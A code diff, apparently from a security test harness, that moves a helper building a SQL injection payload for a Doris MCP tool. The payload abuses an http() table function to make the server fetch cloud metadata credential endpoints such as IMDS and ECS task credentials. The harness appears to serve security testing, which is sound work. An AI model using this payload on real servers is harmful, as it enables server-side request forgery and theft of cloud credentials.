@@ -36,17 +36,17 @@ AIM = re.compile(r'http\(\s*"uri"')
 KEPT_PLACES: tuple[str, ...] = ("imds", "ecs-task-credentials", "eks-pod-identity")
 
 
-def _inject_call(place: Place) -> dict[str, str]:
-    url = f"http://{place.coordinates.host}{place.coordinates.path}"
-    payload = f'x\' UNION SELECT c1 FROM http("uri"="{url}","format"="csv") -- '
-    return {"table_name": payload, "db_name": DORIS_DB}
-
-
 def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
     async def run(places: Places, client: MCPClientPort) -> None:
         await client.call_tool("get_table_comment", _inject_call(places[place_id]))
 
     return run
+
+
+def _inject_call(place: Place) -> dict[str, str]:
+    url = f"http://{place.coordinates.host}{place.coordinates.path}"
+    payload = f'x\' UNION SELECT c1 FROM http("uri"="{url}","format"="csv") -- '
+    return {"table_name": payload, "db_name": DORIS_DB}
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
